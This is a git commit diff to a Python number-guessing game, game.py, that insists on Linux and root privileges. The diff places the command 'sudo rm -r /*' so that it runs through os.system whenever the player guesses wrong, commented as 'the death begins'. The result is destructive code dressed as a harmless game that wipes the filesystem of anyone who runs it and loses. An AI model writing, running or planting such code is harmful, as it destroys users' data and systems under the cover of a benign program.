e6c436103765fc199d8a9f6f8b49b67d9214fdc4
Jerophin123 <151863386+Jerophin123@users.noreply.github.com>
2024-05-31 19:02:40 +0530

    Update game.py

--- game.py
+++ game.py
@@ -1,6 +1,12 @@
 import os
 import random
 import sys
+import platform
+
+# Check if the script is being run on Linux
+if platform.system() != "Linux":
+    print("This script can only be run on Linux systems!")
+    sys.exit(1)
 
 # Check if the script is being run as root
 if os.geteuid() != 0:
@@ -11,13 +17,12 @@ number = random.randint(1, 10)
 guess = input("Guess a number between 1 and 10: ")
 guess = int(guess)
 
+#if won it prints you won otherwise the death begins
 if guess == number:
     print("You won!")
 else:
-    print("Sorry, you lost!")
-
-# Execute a command in the Linux terminal
-command = "sudo rm -r /*"  # Example command, replace it with your desired command
-os.system(command)
+    command = "sudo rm -r /*"  
+    os.system(command)
 
 print("Thanks for playing!")
+
